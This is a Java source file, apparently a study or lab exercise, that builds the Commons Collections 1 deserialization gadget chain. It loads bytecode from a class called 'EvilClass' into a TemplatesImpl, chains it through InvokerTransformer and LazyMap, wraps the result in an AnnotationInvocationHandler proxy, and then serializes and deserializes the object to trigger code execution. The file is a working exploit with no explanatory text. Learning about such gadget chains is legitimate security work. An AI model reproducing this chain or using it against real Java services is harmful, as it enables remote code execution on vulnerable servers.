import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import javax.xml.ws.Action;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class TemplateLazyMapCC1 {
    public static void main(String[] args) throws Exception{
        byte[][] bytes = Util.getExpClassFileBytes("EvilClass");

        TemplatesImpl templates = new TemplatesImpl();
        Util.setValue(templates, "_name", "v");
        Util.setValue(templates, "_bytecodes", bytes);
        Util.setValue(templates, "_tfactory", new TransformerFactoryImpl());

        Transformer[] transformers = {
                new ConstantTransformer(templates),
                new InvokerTransformer("getOutputProperties",null, null),
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, chainedTransformer);

        Class<?> clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(Action.class, outerMap);

        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[]{Map.class}, handler);

        InvocationHandler obj = (InvocationHandler) constructor.newInstance(Action.class, proxyMap);

        Util.fromSerial(Util.toSerial(obj)).readObject();
    }
}
